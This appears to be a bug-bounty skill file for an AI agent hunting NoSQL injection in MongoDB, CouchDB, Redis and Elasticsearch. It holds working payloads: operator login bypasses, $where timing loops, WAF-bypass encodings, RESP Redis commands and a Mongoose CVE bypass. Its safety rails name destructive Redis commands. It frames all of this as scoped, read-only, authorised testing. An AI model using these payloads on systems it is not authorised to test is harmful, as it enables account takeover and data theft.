---
name: hunt-nosqli
description: Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.
sources: hackerone_public
report_count: 14
---

# HUNT-NOSQLI — NoSQL / operator injection

User input becomes a query **operator** or a **command**, not a quoted string. Classic SQL quotes often do nothing here. MongoDB, CouchDB selectors, and Redis RESP are different bugs — pick the branch from the error or the client library, not from the URL.

## Rails
- In-scope only. Read-only by default.
- No credential stuffing, password spraying, or keyspace walks. A login bypass must be shown once, as the user the token actually is.
- No `FLUSHALL`, `SLAVEOF`, `MODULE LOAD`, `SHUTDOWN`, `DEBUG`, or collection dumps. No `$where` busy-loop as a load test.
- Prove one operator effect and stop. Stop at draft. Never auto-submit.
- Do not call a DNS hit or a 500 "auth bypass" or "RCE".

## Decision tree

1. **Is the parameter parsed as structured data?** JSON object, `a[b]=c` (qs / PHP), GraphQL input object, aggregation pipeline, Couch `_find` selector, Redis command built with string concat. If it stays a string, operator injection usually fails — try a syntax error (`$`, unpaired `{`) and compare to baseline.
2. **Send a paired control.**
   - True: `{"$gt": ""}` or `{"$ne": "___unlikely___"}` on a known field.
   - False: `{"$eq": "___unlikely___"}` or `{"$regex": "^___no_such_zzqx___"}`.
   - Baseline: the original string value.
3. **Read the diff.** A session cookie, a changed result count, or a document you do not own = signal. Both "true" and "false" succeeding = the endpoint ignores credentials (broken auth, not NoSQLi). Both failing = quote/operator stripped or not parsed as an object.
4. **Branch on engine.**
   - Mongo / Mongoose / monk / prisma-mongodb → operator keys below. `$where` / `$function` only if the true/false pair already worked; one short delay or one OOB, not a loop.
   - CouchDB `_find` → same selector operators.
   - Redis (usually via SSRF or a string-built command) → one read command (`INFO` or `GET` of a key you created). See below.
   - Elasticsearch → query syntax error vs match. Painless is sandboxed on supported versions; a script error is not RCE.
   - Cosmos DB (SQL API) / DynamoDB PartiQL → SQL-like string queries with no comment terminator to swallow the tail — balance the quote instead: `' OR 1=1 OR '1'='1` vs `' AND 1=2 AND '1'='1`. Same true/false control.
5. **Stop** after one of: authenticated session as a named account, one document you should not see, or one OOB/time confirmation of server-side JS.

## Signals
- JSON login, search, filter, GraphQL `where` / `filter`.
- `Express`, `mongoose`, `MongoServerError`, `unknown operator`, `BadValue`, `$`.
- Query strings `filter[`, `where[`, `q[`, `username[$gt]`.
- Couch `/{db}/_find`, `_all_docs`. Elasticsearch `/_search`.
- Redis is rarely in the HTTP parameter. It shows up when a fetcher, queue, or `gopher://`/`resp://` SSRF hits `6379`.

## Payloads

**Auth / list bypass** — JSON, then the same keys as form fields. Always send the false control.
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "___nope___"}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": "___nope___"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": "___nope___"}}
```
```
username[$gt]=&password[$gt]=
username=admin&password[$ne]=___nope___
username[$regex]=^admin&password[$ne]=___nope___
```
`$regex` with a leading anchor and a **short** prefix proves a boolean oracle. Do not walk the alphabet across the user collection.

**Type confusion** (string vs object vs array) — some apps only sanitize strings:
```json
{"username": ["admin"], "password": ["admin"]}
{"username": {"$eq": "admin"}, "password": {"$regex": ".*"}}
```

**Query / filter sinks** (not just login):
```json
{"filter": {"role": {"$ne": "___none___"}}}
{"$or": [{"role": "admin"}, {"role": "user"}]}
{"age": {"$exists": true}}
{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
```
Aggregation injection: a user-controlled stage (`$match`, `$lookup`, `$group`). `$lookup` against another collection is a data-scope bug if the response grows. One stage, one extra field as proof.

**Server-side JS** (`$where`, `$function`, `$accumulator`) — off by default on many Mongo 4.4+ deployments. Only try after operator injection works.
```json
{"$where": "function(){ return this.username == this.username }"}
{"$where": "function(){ var d=Date.now(); while(Date.now()-d<2000){} return true }"}
```
There is no portable `sleep()` in the Mongo JS runtime. Use the date loop once (2s) and confirm with n≥10 interleaved against a `return false` control only if the body does not already differ. Prefer a boolean `this.username[0]=='a'` style oracle and recover **one character**. Mongoose `populate({match})` (CVE-2024-53900, and the incomplete fix CVE-2025-23061 before 8.9.5 / 7.8.4 / 6.13.6): a top-level `$where` may be rejected while a nested one is not. Send the nested form once, not a dump.

```json
{"$and": [{"$where": "this.username == this.username"}]}
{"$or": [{"$where": "this.username == this.username"}]}
```

**WAF / sanitizer bypass**
| Defense | What to send |
|---|---|
| Body scanner blocks `$` | `{"username":{"\u0024gt":""}}` — `JSON.parse` turns `\u0024` into `$`. Useless if the sanitizer runs **after** parse. |
| `express-mongo-sanitize` strips top-level `$` keys | Nest the operator under a real field, or send `application/x-www-form-urlencoded` `user[$gt]=` if a different parser merges it later. |
| Dotted keys stripped | Array form `{"$or":[{"a":1}]}` or a GraphQL variable object. |
| PHP `mongo` extension casts scalars only | `user[$gt]=` / `user[]=`. |

**CouchDB**
```json
POST /db/_find
{"selector": {"username": {"$gt": null}}}
```
False control: `{"$eq": "___nope___"}`.

**Redis (via an already-proven SSRF or a command string you influence)** — read-only proof:
```
*1\r\n$4\r\nINFO\r\n
*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n
```
If the only write you are allowed is a single key: `SET nosqli-<uniq> <uniq>` then `GET` it back. Do not rewrite `dir`/`dbfilename`, do not `SLAVEOF`, do not flush. A webshell or crontab write is out of this skill unless `hunt-rce` validation is met with one command and the engagement allows it.

**Elasticsearch** — `q=` or JSON `query_string` : `*` vs `___nope___` vs `"` (syntax error). Scripted fields that echo `1+1` → `2` are expression injection; stop at that proof unless `java.lang.Runtime` output actually returns.

## Validation
- **Auth bypass:** `Set-Cookie` or bearer token, then `GET` a post-login resource **with that token** and show a user id/email. False-operator control must not issue a token. Name the account. "First document in the collection" is not "admin" unless the body says so.
- **Data bleed:** one document or field absent from the baseline string query. Diff the JSON. Status 200 on both is not enough.
- **Blind JS:** n≥10 interleaved, 0s vs 2s, non-overlapping times or Welch t > 3. Or one Collaborator hit from a payload that runs only on the true branch.
- **Redis:** `INFO` or `GET` body contains `redis_version` or your unique marker. `FLUSHALL` "worked" is a destructive incident, not a PoC.
- **Not a finding:** JSON 400, `$` stripped and the query still runs as a string, both true and false controls logging you in.

## Chains
| Proven primitive | Chain | Claim only if |
|---|---|---|
| Login operator | Session of the returned user | You loaded `/me` (or equivalent) as that user |
| `$regex` oracle on one field | Read a reset token or email | You show the value and use it once on an account you control |
| `$where` / `$function` | `hunt-rce` only with command output or OOB `id` | Callback/body contains the command result |
| Filter operator on an API | Cross-tenant document | The document belongs to another tenant |
| Redis `INFO` | Internal host disclosure | You quote `redis_version` / `os`. Do not pivot into writes |
| ES query syntax | Cross-index read | A hit from an index you should not query |

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
